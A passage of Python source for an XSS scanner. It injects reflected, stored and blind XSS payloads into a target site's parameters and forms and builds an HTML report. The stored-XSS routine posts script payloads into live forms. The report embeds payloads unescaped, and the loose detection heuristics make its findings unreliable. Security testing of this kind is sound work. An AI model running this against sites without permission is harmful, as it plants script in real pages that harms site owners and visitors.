                                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                                response = self.recon.session.get(test_url, timeout=10)
                                
                                if self.detect_xss_in_response(response, payload):
                                    # Capture screenshot for PoC
                                    screenshot_path = self.screenshot_capture.capture_xss_poc(
                                        test_url, payload, f"Reflected_XSS_{category}"
                                    )
                                    
                                    result = {
                                        'type': 'Reflected XSS',
                                        'parameter': param,
                                        'payload': payload,
                                        'url': test_url,
                                        'method': 'GET',
                                        'response_code': response.status_code,
                                        'category': category,
                                        'screenshot_path': screenshot_path,
                                        'verified': screenshot_path is not None
                                    }
                                    results.append(result)
                                    print(f"  🚨 XSS VULNERABILITY FOUND in parameter: {param}")
                                    print(f"  ✅ Payload: {payload}")
                                    if screenshot_path:
                                        print(f"  📸 PoC Screenshot: {screenshot_path}")
                                    break  # Stop testing this parameter
                                else:
                                    print(f"  ❌ No XSS detected")
                                    
                            except Exception as e:
                                print(f"  ⚠️  Error testing parameter {param}: {e}")
        
        print(f"\n✅ Reflected XSS testing completed. Found {len(results)} vulnerabilities.")
        return results

    def test_stored_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Stored XSS vulnerabilities"""
        print("\n🔍 Testing Stored XSS...")
        results = []
        
        for form_idx, form in enumerate(recon_data['discovered_forms']):
            print(f"\n📝 Testing form {form_idx + 1}: {form['action']}")
            print(f"  Method: {form['method']}")
            
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] in ['text', 'textarea', 'email', 'search']:
                    print(f"\n  🎯 Testing input field: {input_field['name']} (type: {input_field['type']})")
                    
                    # Use simpler payloads for stored XSS
                    test_payloads = [
                        '<script>alert("XSS")</script>',
                        '<img src=x onerror=alert("XSS")>',
                        '<svg onload=alert("XSS")>'
                    ]
                    
                    for payload_idx, payload in enumerate(test_payloads):
                        print(f"    [{payload_idx + 1}/{len(test_payloads)}] Testing payload: {payload}")
                        
                        try:
                            form_data = {}
                            for field in form['inputs']:
                                if field['name']:
                                    if field['name'] == input_field['name']:
                                        form_data[field['name']] = payload
                                    else:
                                        form_data[field['name']] = field['value'] or 'test'
                            
                            print(f"    📤 Submitting form data: {form_data}")
                            
                            if form['method'] == 'POST':
                                response = self.recon.session.post(form['action'], data=form_data, timeout=15)
                            else:
                                response = self.recon.session.get(form['action'], params=form_data, timeout=15)
                            
                            print(f"    📊 Submit Response Code: {response.status_code}")
                            
                            # Wait and check if payload was stored
                            time.sleep(3)
                            print(f"    🔍 Checking if payload was stored...")
                            check_response = self.recon.session.get(form['action'], timeout=10)
                            
                            if self.detect_xss_in_response(check_response, payload):
                                # Capture screenshot for PoC
                                screenshot_path = self.screenshot_capture.capture_xss_poc(
                                    form['action'], payload, "Stored_XSS"
                                )
                                
                                result = {
                                    'type': 'Stored XSS',
                                    'form_action': form['action'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'method': form['method'],
                                    'response_code': response.status_code,
                                    'verification_method': 'response_check',
                                    'screenshot_path': screenshot_path,
                                    'verified': screenshot_path is not None
                                }
                                results.append(result)
                                print(f"    🚨 STORED XSS VULNERABILITY FOUND in field: {input_field['name']}")
                                print(f"    ✅ Payload: {payload}")
                                if screenshot_path:
                                    print(f"    📸 PoC Screenshot: {screenshot_path}")
                            else:
                                print(f"    ❌ No stored XSS detected")
                                
                        except Exception as e:
                            print(f"    ⚠️  Error testing form field {input_field['name']}: {e}")
        
        print(f"\n✅ Stored XSS testing completed. Found {len(results)} vulnerabilities.")
        return results

    def test_blind_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Blind XSS vulnerabilities with advanced payloads"""
        print("\n🔍 Testing Blind XSS with Advanced Payloads...")
        results = []
        
        if 'blind_xss' not in self.payloads.payloads:
            print("  ⚠️  No Blind XSS payloads available")
            return results
        
        total_tests = len(recon_data['discovered_params']) * len(self.payloads.payloads['blind_xss'])
        current_test = 0
        
        for param in recon_data['discovered_params']:
            print(f"\n📝 Testing Blind XSS parameter: {param}")
            
            for payload in self.payloads.payloads['blind_xss']:
                current_test += 1
                print(f"  [{current_test}/{total_tests}] Testing Blind XSS payload: {payload[:50]}...")
                
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    print(f"  🌐 Request URL: {test_url}")
                    
                    response = self.recon.session.get(test_url, timeout=10)
                    print(f"  📊 Response Code: {response.status_code}")
                    
                    # For Blind XSS, we can't detect execution directly
                    # We just inject the payload and hope it gets stored/executed elsewhere
                    result = {
                        'type': 'Blind XSS',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'method': 'GET',
                        'response_code': response.status_code,
                        'note': 'Payload injected - check webhook/logs for execution'
                    }
                    results.append(result)
                    print(f"  📤 Blind XSS payload injected in parameter: {param}")
                    print(f"  ✅ Payload: {payload}")
                    
                except Exception as e:
                    print(f"  ⚠️  Error testing Blind XSS parameter {param}: {e}")
        
        print(f"\n✅ Blind XSS testing completed. Injected {len(results)} payloads.")
        return results

    def test_dom_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for DOM XSS vulnerabilities"""
        print("\n🔍 Testing DOM XSS...")
        results = []
        
        # DOM XSS testing requires browser automation
        # For now, we'll just return empty results
        print("  ⚠️  DOM XSS testing requires browser automation (Selenium)")
        print("  📝 This feature will be implemented in future versions")
        
        return results

    def detect_xss_in_response(self, response: requests.Response, payload: str) -> bool:
        """Detect if XSS payload was reflected in response"""
        content = response.text
        content_lower = content.lower()
        payload_lower = payload.lower()
        
        print(f"    🔍 Checking response for payload reflection...")
        print(f"    📄 Response length: {len(content)} characters")
        
        # Check direct reflection
        if payload_lower in content_lower:
            print(f"    ✅ Direct payload reflection found!")
            return True
        
        # Check for HTML-encoded reflection
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        if html_encoded.lower() in content_lower:
            print(f"    ✅ HTML-encoded payload reflection found!")
            return True
        
        # Check for URL-encoded reflection
        url_encoded = urllib.parse.quote(payload)
        if url_encoded.lower() in content_lower:
            print(f"    ✅ URL-encoded payload reflection found!")
            return True
        
        # Check for partial reflection (common in XSS)
        script_tag = '<script'
        if script_tag in content_lower and 'alert' in content_lower:
            print(f"    ✅ Script tag and alert found in response!")
            return True
        
        # Check if our specific payload is reflected (even partially)
        if 'script' in payload_lower and '<script' in content_lower:
            print(f"    ✅ Script tag from payload found in response!")
            return True
        
        if 'img' in payload_lower and 'onerror' in content_lower:
            print(f"    ✅ Image onerror from payload found in response!")
            return True
        
        if 'svg' in payload_lower and 'onload' in content_lower:
            print(f"    ✅ SVG onload from payload found in response!")
            return True
        
        # Check for img tag with onerror
        img_onerror = 'onerror'
        if img_onerror in content_lower and 'src=' in content_lower:
            print(f"    ✅ Image onerror attribute found in response!")
            return True
        
        # Check for SVG with onload
        svg_onload = 'onload'
        if svg_onload in content_lower and '<svg' in content_lower:
            print(f"    ✅ SVG onload attribute found in response!")
            return True
        
        # Check for iframe with javascript:
        iframe_js = 'javascript:'
        if iframe_js in content_lower and '<iframe' in content_lower:
            print(f"    ✅ iframe with javascript: found in response!")
            return True
        
        # Additional checks for common XSS patterns
        xss_patterns = [
            ('<script', 'script tag'),
            ('onerror=', 'onerror attribute'),
            ('onload=', 'onload attribute'),
            ('onmouseover=', 'onmouseover attribute'),
            ('onfocus=', 'onfocus attribute'),
            ('javascript:', 'javascript protocol'),
            ('vbscript:', 'vbscript protocol'),
            ('data:text/html', 'data protocol'),
        ]
        
        found_patterns = []
        for pattern, description in xss_patterns:
            if pattern in content_lower:
                found_patterns.append(description)
        
        if found_patterns:
            print(f"    ⚠️  Potential XSS patterns found: {', '.join(found_patterns)}")
            # If we find multiple suspicious patterns, consider it a potential XSS
            if len(found_patterns) >= 2:
                print(f"    ✅ Multiple XSS patterns detected - likely vulnerability!")
                return True
        
        print(f"    ❌ No XSS indicators found in response")
        return False

    def run_scan(self) -> Dict:
        """Run complete XSS scan"""
        logger.info(f"Starting XSS scan for: {self.target_url}")
        
        scan_results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'reconnaissance': {},
            'vulnerabilities': [],
            'summary': {
                'total_vulnerabilities': 0,
                'reflected_xss': 0,
                'stored_xss': 0,
                'dom_xss': 0,
                'blind_xss': 0
            }
        }
        
        try:
            scan_results['reconnaissance'] = self.run_reconnaissance()
            
            # Test all XSS types
            reflected_results = self.test_reflected_xss(scan_results['reconnaissance'])
            stored_results = self.test_stored_xss(scan_results['reconnaissance'])
            dom_results = self.test_dom_xss(scan_results['reconnaissance'])
            blind_results = self.test_blind_xss(scan_results['reconnaissance'])
            
            # Add all results
            scan_results['vulnerabilities'].extend(reflected_results)
            scan_results['vulnerabilities'].extend(stored_results)
            scan_results['vulnerabilities'].extend(dom_results)
            scan_results['vulnerabilities'].extend(blind_results)
            
            # Update summary
            scan_results['summary']['total_vulnerabilities'] = len(scan_results['vulnerabilities'])
            scan_results['summary']['reflected_xss'] = len(reflected_results)
            scan_results['summary']['stored_xss'] = len(stored_results)
            scan_results['summary']['dom_xss'] = len(dom_results)
            scan_results['summary']['blind_xss'] = len(blind_results)
            
            logger.info(f"Scan completed. Found {scan_results['summary']['total_vulnerabilities']} vulnerabilities")
            
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            scan_results['error'] = str(e)
        
        return scan_results

    def save_report(self, results: Dict, output_file: str = None):
        """Save scan results to HTML file"""
        if not output_file:
            output_file = f"xss_scan_report_{int(time.time())}.html"
        
        try:
            # Generate HTML report
            html_content = self.generate_html_report(results)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"HTML Report saved to: {output_file}")
            
        except Exception as e:
            logger.error(f"Error saving report: {e}")
    
    def generate_html_report(self, results: Dict) -> str:
        """Generate comprehensive HTML report"""
        timestamp = results.get('timestamp', datetime.now().isoformat())
        target = results.get('target', 'Unknown')
        vulnerabilities = results.get('vulnerabilities', [])
        summary = results.get('summary', {})
        recon = results.get('reconnaissance', {})
        
        # Count vulnerabilities by type
        vuln_counts = {
            'Reflected XSS': len([v for v in vulnerabilities if 'Reflected' in v.get('type', '')]),
            'Stored XSS': len([v for v in vulnerabilities if 'Stored' in v.get('type', '')]),
            'DOM XSS': len([v for v in vulnerabilities if 'DOM' in v.get('type', '')]),
            'Blind XSS': len([v for v in vulnerabilities if 'Blind' in v.get('type', '')])
        }
        
        # Generate vulnerability cards
        vuln_cards = ""
        for i, vuln in enumerate(vulnerabilities, 1):
            vuln_type = vuln.get('type', 'Unknown')
            parameter = vuln.get('parameter', vuln.get('form_action', 'Unknown'))
            payload = vuln.get('payload', 'Unknown')
            url = vuln.get('url', 'Unknown')
            method = vuln.get('method', 'Unknown')
            response_code = vuln.get('response_code', 'Unknown')
            screenshot_path = vuln.get('screenshot_path', '')
            verified = vuln.get('verified', False)
            category = vuln.get('category', 'basic')
            
            # Severity based on type
            severity = "High" if "XSS" in vuln_type else "Medium"
            severity_color = "#dc3545" if severity == "High" else "#ffc107"
            
            vuln_cards += f"""
            <div class="vulnerability-card">
                <div class="vuln-header">
                    <h3>#{i} {vuln_type}</h3>
                    <span class="severity" style="background-color: {severity_color}">{severity}</span>
                </div>
                <div class="vuln-details">
                    <div class="detail-row">
                        <strong>Parameter:</strong> <code>{parameter}</code>
                    </div>
                    <div class="detail-row">
                        <strong>Payload:</strong> <code class="payload">{payload}</code>
                    </div>
                    <div class="detail-row">
                        <strong>URL:</strong> <a href="{url}" target="_blank">{url}</a>
                    </div>
                    <div class="detail-row">
                        <strong>Method:</strong> {method}
                    </div>
                    <div class="detail-row">
                        <strong>Response Code:</strong> {response_code}
                    </div>
                    <div class="detail-row">
                        <strong>Category:</strong> {category}
                    </div>
                    <div class="detail-row">
                        <strong>Verified:</strong> {'✅ Yes' if verified else '❌ No'}
                    </div>
                    {f'<div class="detail-row"><strong>PoC File:</strong> <a href="{screenshot_path}" target="_blank">{screenshot_path}</a></div>' if screenshot_path else ''}
                </div>
            </div>
            """
        
        # Generate reconnaissance info
        discovered_params = recon.get('discovered_params', set())
        discovered_forms = recon.get('discovered_forms', [])
        waf_detected = recon.get('waf_detected', {})
        
        params_list = ""
        for param in list(discovered_params)[:20]:  # Show first 20
            params_list += f"<li><code>{param}</code></li>"
        if len(discovered_params) > 20:
            params_list += f"<li><em>... and {len(discovered_params) - 20} more</em></li>"
        
        forms_list = ""
        for i, form in enumerate(discovered_forms, 1):
            forms_list += f"""
            <div class="form-info">
                <strong>Form {i}:</strong> {form.get('action', 'Unknown')} ({form.get('method', 'Unknown')})
                <ul>
            """
            for field in form.get('inputs', []):
                if field.get('name'):
                    forms_list += f"<li><code>{field['name']}</code> ({field.get('type', 'text')})</li>"
            forms_list += "</ul></div>"
        
        waf_info = ""
        if any(waf_detected.values()):
            detected_wafs = [waf for waf, detected in waf_detected.items() if detected]
            waf_info = f"<p><strong>Detected WAFs:</strong> {', '.join(detected_wafs)}</p>"
        else:
            waf_info = "<p><strong>WAF Status:</strong> No WAF detected</p>"
        
        html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Scanner Report - {target}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        .header {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
        }}
        
        .header h1 {{
            color: #2c3e50;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
        }}
        
        .header p {{
            color: #7f8c8d;
            font-size: 1.2em;
        }}
        
        .summary {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }}
        
        .summary h2 {{
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8em;
        }}
        
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }}
        
        .stat-card {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }}
        
        .stat-card h3 {{
            font-size: 2em;
            margin-bottom: 5px;
        }}
        
        .stat-card p {{
            font-size: 1.1em;
            opacity: 0.9;
        }}
        
        .vulnerabilities {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }}
        
        .vulnerabilities h2 {{
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8em;
        }}
        
        .vulnerability-card {{
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }}
        
        .vulnerability-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
        }}
        
        .vuln-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }}
        
        .vuln-header h3 {{
            color: #2c3e50;
            font-size: 1.3em;
        }}
        
        .severity {{
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9em;
        }}
        
        .vuln-details {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 10px;
        }}
        
        .detail-row {{
            margin-bottom: 8px;
        }}
        
        .detail-row strong {{
            color: #2c3e50;
            display: inline-block;
            width: 120px;
        }}
        
        code {{
            background: #e9ecef;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        
        .payload {{
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            word-break: break-all;
        }}
        
        .reconnaissance {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }}
        
        .reconnaissance h2 {{
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8em;
        }}
        
        .recon-section {{
            margin-bottom: 25px;
        }}
        
        .recon-section h3 {{
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 1.2em;
        }}
        
        .recon-section ul {{
            margin-left: 20px;
        }}
        
        .recon-section li {{
            margin-bottom: 5px;
        }}
        
        .form-info {{
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }}
        
        .footer {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }}
        
        .footer p {{
            color: #7f8c8d;
            font-size: 0.9em;
        }}
        
        @media (max-width: 768px) {{
            .container {{
                padding: 10px;
            }}
            
            .header h1 {{
                font-size: 2em;
            }}
            
            .stats {{
                grid-template-columns: 1fr;
            }}
            
            .vuln-details {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 XSS Scanner Report</h1>
            <p>Advanced XSS Vulnerability Detection & Exploitation Tool</p>
            <p><strong>Target:</strong> {target}</p>
            <p><strong>Scan Date:</strong> {timestamp}</p>
        </div>
        
        <div class="summary">
            <h2>📊 Scan Summary</h2>
            <div class="stats">
                <div class="stat-card">
                    <h3>{summary.get('total_vulnerabilities', 0)}</h3>
                    <p>Total Vulnerabilities</p>
                </div>
                <div class="stat-card">
                    <h3>{vuln_counts['Reflected XSS']}</h3>
                    <p>Reflected XSS</p>
                </div>
                <div class="stat-card">
                    <h3>{vuln_counts['Stored XSS']}</h3>
                    <p>Stored XSS</p>
                </div>
                <div class="stat-card">
                    <h3>{vuln_counts['DOM XSS']}</h3>
                    <p>DOM XSS</p>
                </div>
                <div class="stat-card">
                    <h3>{vuln_counts['Blind XSS']}</h3>
                    <p>Blind XSS</p>
                </div>
            </div>
        </div>
        
        <div class="vulnerabilities">
            <h2>🚨 Vulnerabilities Found</h2>
            {vuln_cards if vulnerabilities else '<p style="text-align: center; color: #7f8c8d; font-size: 1.2em; padding: 40px;">No vulnerabilities found</p>'}
        </div>
        
        <div class="reconnaissance">
            <h2>🔍 Reconnaissance Details</h2>
            
            <div class="recon-section">
                <h3>📝 Discovered Parameters ({len(discovered_params)})</h3>
                <ul>
                    {params_list}
                </ul>
            </div>
            
            <div class="recon-section">
                <h3>📋 Discovered Forms ({len(discovered_forms)})</h3>
                {forms_list if discovered_forms else '<p>No forms discovered</p>'}
            </div>
            
            <div class="recon-section">
                <h3>🛡️ WAF Detection</h3>
                {waf_info}
            </div>
        </div>
        
        <div class="footer">
            <p>Generated by Advanced XSS Scanner v1.0.0</p>
            <p>Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
    </div>
</body>
</html>
        """
        
        return html_template

def print_banner():
    """Print application banner"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                  Advanced XSS Scanner v1.0.0                ║
║              Complete Reconnaissance & Exploitation          ║
║                                                              ║
║  Features:                                                   ║
║  ✓ Full Reconnaissance & Target Discovery                    ║
║  ✓ WAF Detection & Bypass                                    ║
║  ✓ Custom Popup System                                       ║
║  ✓ All XSS Types (Reflected, Stored, DOM, Blind)            ║
║  ✓ Comprehensive Reporting                                   ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-o', '--output', help='Output file for report')
    parser.add_argument('--no-crawl', action='store_true', help='Disable URL crawling')
    parser.add_argument('--callback-url', help='Callback URL for blind XSS testing')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    print_banner()
    
    options = {
        'crawl': not args.no_crawl,
        'callback_url': args.callback_url
    }
    
    scanner = XSSScanner(args.target, options)
    results = scanner.run_scan()
    scanner.save_report(results, args.output)
    
    print(f"\n=== XSS Scan Summary ===")
    print(f"Target: {results['target']}")
    print(f"Total Vulnerabilities: {results['summary']['total_vulnerabilities']}")
    print(f"Reflected XSS: {results['summary']['reflected_xss']}")
    print(f"Stored XSS: {results['summary']['stored_xss']}")
    print(f"DOM XSS: {results['summary']['dom_xss']}")
    print(f"Blind XSS: {results['summary']['blind_xss']}")
    
    if results['vulnerabilities']:
        print(f"\n=== Vulnerabilities Found ===")
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            print(f"{i}. {vuln['type']} - {vuln.get('parameter', vuln.get('url', 'Unknown'))}")

if __name__ == '__main__':
    main()
